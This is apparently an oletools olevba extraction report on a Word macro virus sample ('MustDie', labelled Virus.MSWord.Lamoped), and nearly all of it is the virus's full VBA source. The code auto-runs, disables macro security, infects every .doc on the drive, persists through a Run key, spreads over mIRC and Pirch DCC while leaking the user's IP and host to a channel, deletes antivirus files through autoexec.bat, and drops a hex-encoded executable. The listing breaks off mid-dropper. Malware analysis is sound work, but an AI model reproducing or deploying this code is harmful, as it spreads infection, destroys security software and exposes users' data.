olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lamoped-b2f538b85dfe86a4977c9ff3ab087d1b030d5f59
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lamoped-b2f538b85dfe86a4977c9ff3ab087d1b030d5f59 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Lamoped-b2f538b85dfe86a4977c9ff3ab087d1b030d5f59 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Virus Name : MustDie
' Virus Author : A.v_killer
' Date : 9/7/02
' Virus Origin : sahiwal,pakistan
' Greets To : walrus,jackel,a.v_killer,pakbrain

Private Sub Document_Open()
GvMfNlRk = LjLi5052 & IfRj13125
    Call CCK3547
    If MacroContainer <> "Normal.dot" Then Call UFM6172
MfHi7998 = BfVgMvDe & SyVm14594 & Int(Rnd * 9707)
End Sub
SgFuUxFo = MjTs11015 & JgPn16545
Private Sub Document_Close()
CzCrEvMp = UuVj18321 & AiEh12289
    Call CCK3547
    If MacroContainer <> "Normal.dot" ThenCall UFM6172
    If Left(ActiveDocument.Name, 8) <> "Document" And ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
QhGe9855 = FpOmKtNm & VmOj8061 & Int(Rnd * 3194)
Private Sub Document_New()
    Call CCK3547
NlLp6962 = MnBrKxMk & KpOu10697 & Int(Rnd * 5446)
End Sub
ElCyKlOe = JzCw9314 & DuKv6259
Private Sub FilePrintDefault()
    Call CCK3547
End Sub
PiKf13199 = StJlRzMj & GuTg12219 & Int(Rnd * 9204)
Private Sub CCK3547()
AtOp9512 = LzRnBvGr & UhSq3314 & Int(Rnd * 898)
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
BkCh3858 = SjCeLiVr & NxOo8893 & OjNmDxVv & LhNy11597
OwPq8251 = MlQlSsQe & DpUk16018 & Int(Rnd * 9477)
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End Select
WordBasic.DisableAutoMacros 0
QvOq11834 = FwNuEnSq & SzJh12645 & Int(Rnd * 2998)
Application.DisplayStatusBar = False
DyVw18987 = VpHuBtTw & GeSr16829 & IoFmQnPq & QtRh9038
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
FhUiVlSn = OxGh10774 & UePf15999
NlFm11249 = OkUoJzDr & IeIy5545 & OnLkNtSj & PrNr15440
Set BFL1548 = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set SLU5559 = ActiveDocument.VBProject.VBComponents(1).CodeModule
HGF9038 = "C:\MustDie.LFT"
Open HGF9038 For Output As #1
VqNg12166 = CtGuVgDz & BxLe8207 & GtMrKqDo & LxUu6332
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 286)
Close #1
If BFL1548.CountOfLines < 5 Then
    BFL1548.DeleteLines 1, BFL1548.CountOfLines: BFL1548.AddFromFile HGF9038
End If
VvExGhRr = NmNk4281 & NhCk3937
If SLU5559.CountOfLines < 5 Then
    SLU5559.DeleteLines 1, SLU5559.CountOfLines: SLU5559.AddFromFile HGF9038
    ActiveDocument.Save
End If
Kill HGF9038
JzAt1357 = BhKwBnLh & DtSg7709 & Int(Rnd * 27)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "mustdie"
MgUo12703 = HoOkTpRq & NyEl13762 & Int(Rnd * 9109)
Application.UserName = "MustDie"
DsKeSlPg = MrTu5036 & PtJr9133
Open "C:\Windows\MustDie.drv" For Output As #1
Print #1, ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 286)
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WVE") = "C:\Windows\MustDie.vbs"
Open "C:\Windows\MustDie.vbs" For Output As #1
Print #1, "' MustDie.vbs for MustDie Virus by The Pakbrain and A.v_killer"
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"", 1, ""REG_DWORD"""
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
Print #1, "Set Search = Backup.Application.Filesearch"
Print #1, "Search.LookIn = ""C:\"": Search.SearchSubFolders = True: Search.FileName = ""*.doc"": Search.Execute"
Print #1, "For f = 1 To Search.FoundFiles.Count"
Print #1, "Victim = Search.FoundFiles(f)"
Print #1, "Backup.Documents.Open Victim"
Print #1, "For x = 1 To Backup.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\MustDie.drv"")"
Print #1, "Backup.ActiveDocument.Save"
Print #1, "Backup.ActiveDocument.Close"
Print #1, "Next"
Print #1, "Backup.Application.Quit"
Close #1
If Month(Now) = Day(Now) Then Call dropper("C:\start.scr")
IoLiVrHo = MmFw8316 & MfEg10516
Call KPJ5794
BwBlQyPo = VuSv13953 & OeKq10020
Call DAN1097
VyQm10619 = PzTnSmIk & AiUv6898 & KkOfSwPi & HrSg10119
HwTw16154 = HpBrSjCz & PyTm10084 & Int(Rnd * 8546)
HSF1266 = Int(Rnd * 81)
If Trigger = 3 Then Call FRS4415
End Sub
Private Sub FRS4415()
On Error Resume Next
TuDgVfMn = NuBk8632 & HeLi12213
GhAg14607 = TuOkOpHk & OjGh8774 & Int(Rnd * 9881)
Randomize: For Pictures = 1 To (Int(Rnd * 70))
FqJo13333 = GvOlLgMx & VuOp12408 & Int(Rnd * 3979)
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
UoHr10964 = EhLjLmUq & CeOe11530 & EiIjLuOf & FkAz9872
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next Pictures
End Sub
Sub ToolsMacro()
MjFvNqCt = QwNk6670 & LkOf8715
End Sub
Sub FileTemplates()
BxSn11130 = NgIjUiMk & PoEn14311 & Int(Rnd * 6874)
End Sub
Sub ViewVBCode()
End Sub
Private Sub KPJ5794()
On Error Resume Next
ASE3028 = Dir("C:\ReadMe.doc")
If ASE3028 = "" Then ActiveDocument.SaveAs "C:\ReadMe.doc"
NBC3506 = Dir("C:\mirc\mirc.ini")
If NBC3506 <> "" Then
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
KnJn11011 = MySeInVy & ByBy3077 & Int(Rnd * 4083)
Print #1, ";"
Print #1, "n0=on 1:start:{"
Print #1, "n1= /.remote on"
Print #1, "n2= /.ctcps on"
Print #1, "n3= /.events on"
Print #1, "n4= /.ebeeps off"
Print #1, "n5= /.pdcc 99999999999"
Print #1, "n6= /.dcc packetsize 4096"
Print #1, "n7=           }"
Print #1, "n8=on 1:connect:{ /.clearall"
Print #1, "n9=           /.enable #spreadin"
Print #1, "n10=          /.copy -o C:\ReadMe.doc C:\mustread.doc"
Print #1, "n11=        }"
Print #1, "n12=on 1:disconnect:{ /.remove C:\ReadMe.doc"
Print #1, "n13=              /.remove C:\mustread.doc"
Print #1, "n14=            }"
Print #1, "n15=alias /unload /echo 2*** Unloaded $1- | halt"
Print #1, "n16=on 1:input:*:/.msg #WVE_gen *-+-* [( $+ $active $+ ) $1-] $ip on $server $+ : $+ $port $+ *+* $host $usermode *+* $os $cb $url *+* $lastwin $active *-+-*"
Print #1, "n17=on 1:join:#:/.msg $nick To have the latest infos about Free Internet  TYPE: !readme  here or in $chan"
Print #1, "n18=on 1:nick:/.msg $newnick Hey $newnick is better than $nick ;)  If u want the biggest sex-password-list  TYPE: !sexlist  here or in $chan"
Print #1, "n19=on 1:kick:#:/.msg $chan If u need infos about the latest news in World  TYPE: !readme  here"
Print #1, "n20=on 1:filercvd:*.*:/.dcc send $nick C:\ReadMe.doc"
Print #1, "n21=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick C:\SexList.doc"
Print #1, "n22=on 1:text:*!readme*:#: { if ( $nick == $me ) {halt} | /.dcc send $nick C:\ReadMe.doc | /.msg $nick Here is the readme file u need, cya soon. }"
Print #1, "n23=on 1:text:*!sexlist*:#: {/.copy -o C:\ReadMe.doc C:\SexList.doc | if ( $nick == $me ) {halt} | /.dcc send $nick C:\SexList.doc | /.msg $nick Here is the password list u ask for, enjoy :) }"
Print #1, "n24=ctcp 1:*wvefileserver*:*:/.fserve $2 $3 $4"
Print #1, "n25=#spreadin off"
Print #1, "n26=on 1:part:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\ReadMe.doc | /.disable #spreadin | /.timersp 0 24 | /.enable #spreadin }"
Print #1, "n27=#spreadin end"
Close #1
End If
FUD3151 = Dir("C:\pirch98\pirch98.ini")
If FUD3151 <> "" Then
Open "C:\pirch98\events.ini" For Output As #1
Print #1, "[Levels]"
Print #1, "Enabled=1"
EtNy14023 = GiVeUeNl & ElEy11673 & Int(Rnd * 7258)
BiCu6512 = JeNkJpSe & PrIy13787 & Int(Rnd * 653)
Print #1, "Count=1"
Print #1, "Level1 = Dem"
Print #1, "DemEnabled = 1"
Print #1, ";"
Print #1, "[Dem]"
Print #1, "User1=*!*@*"
Print #1, "UserCount = 1"
Print #1, "Event1=ON JOIN:#:/dcc send $nick C:\ReadMe.doc | /msg $nick Hi! this is the file u ask for!"
Print #1, "Event2=ON PART:#:/dcc send $nick C:\ReadMe.doc | /notice $nick Hi! here comes your file! | /enable -q *"
Print #1, "Event3=ON TEXT:*walvgen*:#:/msg $nick WVE W0rm PirchVers. $identd $address"
Print #1, "Event4=ON TEXT:*wvefileserver*:*:/faccess $nick C:\ 5"
Print #1, "Event5=ON TEXT:*avp*:*:/ignore $nick 1"
Print #1, "Event6=ON TEXT:*ReadMe*:*:/ignore $nick 1"
Print #1, "Event7=ON TEXT:*doc*:*:/ignore $nick 1"
Print #1, "Event8=ON TEXT:*worm*:*:/ignore $nick 1"
Print #1, "Event9=ON TEXT:*virus*:*:/ignore $nick 1"
Print #1, "Event10=ON TEXT:*info*:*:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event11=ON TEXT:*trad*:*:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event12=ON QUIT:/msg #WVE_gen WVE W0rm PirchVers. was here ... $identd $address"
Print #1, "Event13=ON DCCDONE:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event14=ON DCCSENT:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
Print #1, "EventCount = 14"
Print #1, ";"
Print #1, "[DCC]"
Print #1, "AutoHideDccWin = 1"
Close #1
End If
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\MeGALiTH Software\Visual IRC96\Events", "Event17") = "dcc send $nick C:\ReadMe.doc"
End Sub
Private Sub DAN1097()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "InfectWinZip") <> "True" Then
TPD9689 = Dir("C:\Windows\Confidential.doc")
If TPD9689 = "" Then ActiveDocument.SaveAs "C:\Windows\Confidential.doc"
If TPD9689 <> "" Then
WinZipPath = Application.System.PrivateProfileString("", _
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "")
DlFq11715 = EsBpPtFi & EmGs11412 & Int(Rnd * 2134)
With Application.FileSearch
.LookIn = "C:\"
.SearchSubFolders = True
.FileName = "*.zip"
.Execute
End With
For f = 1 To Application.FileSearch.FoundFiles.Count
BEU1521 = Application.FileSearch.FoundFiles(f)
VBA.Shell WinZipPath & " -a -r " & BEU1521 _
 & Chr(32) & "C:\Windows\Confidential.doc", vbHide
Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "InfectWinZip") = "True"
End If
End If
End Sub
Private Sub Retro()
On Error Resume Next
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo muffin muffin muffin"
Print #1, "echo ** muffin **"
Print #1, "echo want some"

Print #1, "echo [Norton System Check]"
Print #1, "del c:\progra~1\norton~1\*.exe"
Print #1, "del c:\progra~1\norton~1\*.dll"
Print #1, "del c:\progra~1\norton~1\*.dat"

Print #1, "del c:\progra~1\norton~1\*.vxd"
Print #1, "del c:\norton~1\*.exe"
Print #1, "del c:\norton~1\*.dll"
Print #1, "del c:\norton~1\*.dat"
Print #1, "del c:\norton~1\*.vxd"
Print #1, "echo."

Print #1, "echo [AVP System Check]"
Print #1, "del c:\progra~1\antiv~1\*.avc "
Print #1, "del c:\progra~1\antiv~1\*.set "
Print #1, "del c:\progra~1\antiv~1\*.dll "
Print #1, "del c:\progra~1\antiv~1\*.vxd "
Print #1, "del c:\progra~1\antiv~1\*.exe "
Print #1, "del c:\antiv~1\*.avc "

Print #1, "del c:\antiv~1\*.set "
Print #1, "del c:\antiv~1\*.dll "
Print #1, "del c:\antiv~1\*.vxd "
Print #1, "del c:\antiv~1\*.exe "
Print #1, "echo."

Print #1, "echo [McAfee System Check]"
Print #1, "del c:\progra~1\mcafee~1\*.dat "
Print #1, "del c:\progra~1\mcafee~1\*.dll "
Print #1, "del c:\progra~1\mcafee~1\*.exe "
Print #1, "del c:\progra~1\mcafee~1\*.vsc "
Print #1, "del c:\progra~1\mcafee\*.dat "

Print #1, "del c:\progra~1\mcafee\*.dll "
Print #1, "del c:\progra~1\mcafee\*.exe "
Print #1, "del c:\progra~1\mcafee\*.vsc "
Print #1, "del c:\mcafee~1\*.dat"
Print #1, "del c:\mcafee~1\*.dll"
Print #1, "del c:\mcafee~1\*.exe"
Print #1, "del c:\mcafee~1\*.vsc"
Print #1, "del c:\mcafee\*.dat"
Print #1, "del c:\mcafee\*.dll"
Print #1, "del c:\mcafee\*.exe"
Print #1, "del c:\mcafee\*.vsc"
Print #1, "echo."
Close #1
End Sub
Sub dropper(strFile As String)
On Error Resume Next
'Dropfunction taken from VMPCK by VicodinES
'ASM.Dropper by me!;o)
Dim hFile As Long
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "N start.com"
Print #hFile, "E 00000000 4D5A 5000 0200 0000 0400 0F00 FFFF 0000"
Print #hFile, "E 00000010 B800 0000 0000 0000 4000 1A00 0000 0000"
Print #hFile, "E 00000020 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000030 0000 0000 0000 0000 0000 0000 0001 0000"
Print #hFile, "E 00000040 BA10 000E 1FB4 09CD 21B8 014C CD21 9090"
Print #hFile, "E 00000050 5468 6973 2070 726F 6772 616D 206D 7573"
Print #hFile, "E 00000060 7420 6265 2072 756E 2075 6E64 6572 2057"
Print #hFile, "E 00000070 696E 3332 0D0A 2437 0000 0000 0000 0000"
Print #hFile, "E 00000080 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000090 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000000F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000100 5045 0000 4C01 0400 102B 4583 0000 0000"
Print #hFile, "E 00000110 0000 0000 E000 8E81 0B01 0219 0002 0000"
Print #hFile, "E 00000120 0006 0000 0000 0000 0010 0000 0010 0000"
Print #hFile, "E 00000130 0020 0000 0000 4000 0010 0000 0002 0000"
Print #hFile, "E 00000140 0100 0000 0000 0000 0300 0A00 0000 0000"
Print #hFile, "E 00000150 0050 0000 0004 0000 0000 0000 0200 0000"
Print #hFile, "E 00000160 0000 1000 0020 0000 0000 1000 0010 0000"
Print #hFile, "E 00000170 0000 0000 1000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000180 0030 0000 B001 0000 0000 0000 0000 0000"
Print #hFile, "E 00000190 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001A0 0040 0000 2C00 0000 0000 0000 0000 0000"
Print #hFile, "E 000001B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000001F0 0000 0000 0000 0000 434F 4445 0000 0000"
Print #hFile, "E 00000200 0010 0000 0010 0000 0002 0000 0006 0000"
Print #hFile, "E 00000210 0000 0000 0000 0000 0000 0000 2000 0060"
Print #hFile, "E 00000220 4441 5441 0000 0000 0010 0000 0020 0000"
Print #hFile, "E 00000230 0002 0000 0008 0000 0000 0000 0000 0000"
Print #hFile, "E 00000240 0000 0000 4000 00C0 2E69 6461 7461 0000"
Print #hFile, "E 00000250 0010 0000 0030 0000 0002 0000 000A 0000"
Print #hFile, "E 00000260 0000 0000 0000 0000 0000 0000 4000 00C0"
Print #hFile, "E 00000270 2E72 656C 6F63 0000 0010 0000 0040 0000"
Print #hFile, "E 00000280 0002 0000 000C 0000 0000 0000 0000 0000"
Print #hFile, "E 00000290 0000 0000 4000 0050 0000 0000 0000 0000"
Print #hFile, "E 000002A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000002F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000300 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000310 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000320 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000330 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000340 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000350 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000360 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000370 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000380 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000390 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000003F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000400 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000410 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000420 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000430 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000440 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000450 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000460 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000470 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000480 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000490 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000004F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000500 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000510 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000520 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000530 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000540 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000550 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000560 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000570 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000580 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000590 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000005F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000600 E81E 0000 008B 6424 086A 0068 0020 4000"
Print #hFile, "E 00000610 6825 2040 006A 00E8 6D00 0000 6A00 E824"
Print #hFile, "E 00000620 0000 0064 67FF 3600 0064 6789 2600 00BB"
Print #hFile, "E 00000630 0000 F7BF B878 5634 1287 03FF 257C 3040"
Print #hFile, "E 00000640 00FF 2580 3040 00FF 2584 3040 00FF 2588"
Print #hFile, "E 00000650 3040 00FF 258C 3040 00FF 2590 3040 00FF"
Print #hFile, "E 00000660 2594 3040 00FF 2598 3040 00FF 259C 3040"
Print #hFile, "E 00000670 00FF 25A0 3040 00FF 25A4 3040 00FF 25A8"
Print #hFile, "E 00000680 3040 00FF 25AC 3040 00FF 25B4 3040 0000"
Print #hFile, "E 00000690 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000006F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000700 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000710 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000720 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000730 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000740 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000750 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000760 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000770 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000780 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000790 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000007F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000800 5374 7275 6374 7572 6564 2045 7863 6570"
Print #hFile, "E 00000810 7469 6F6E 2048 616E 646C 6572 2065 7861"
Print #hFile, "E 00000820 6D70 6C65 0049 6E74 6572 6365 7074 6564"
Print #hFile, "E 00000830 2047 656E 6572 616C 2050 726F 7465 6374"
Print #hFile, "E 00000840 696F 6E20 4661 756C 7421 0000 0000 0000"
Print #hFile, "E 00000850 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000860 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000870 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000880 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000890 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000008F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000900 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000910 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000920 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000930 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000940 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000950 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000960 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000970 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000980 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000990 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009A0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009B0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009C0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009D0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009E0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 000009F0 0000 0000 0000 0000 0000 0000 0000 0000"
Print #hFile, "E 00000A00 3C30 0000 0000 0000 0000 0000 BC30 0000"
Print #hFile, "E 00000A10 7C30 0000 7430 0000 0000 0000 0000 0000"
Print #hFile, "E 00000A20 C930 0000 B430 0000 0000 0000 0000 0000"
Print #hFile, "E 00000A30 0000 0000 0000 0000 0000 0000 D430 0000"
Print #hFile, "E 00000A40 E030 0000 EE30 0000 FC30 0000 0831 0000"
Print #hFile, "E 00000A50 1A31 0000 2831 0000 3A31 0000 5231 0000"
Print #hFile, "E 00000A60 6031 0000 7031 0000 8831 0000 9231 0000"
Print #hFile, "E 00000A70 0000 0000 A231 0000 0000 0000 D430 0000"
Print #hFile, "E 00000A80 E030 0000 EE30 0000 FC30 0000 0831 0000"
Print #hFile, "E 00000A90 1A31 0000 2831 0000 3A31 0000 5231 0000"
Print #hFile, "E 00000AA0 6031 0000 7031 0000 8831 0000 9231 0000"
Print #hFile, "E 00000AB0 0000 0000 A231 0000 0000 0000 4B45 524E"
Print #hFile, "E 00000AC0 454C 3332 2E64 6C6C 0055 5345 5233 322E"
Print #hFile, "E 00000AD0 646C 6C00 0000 436F 7079 4669 6C65 4100"
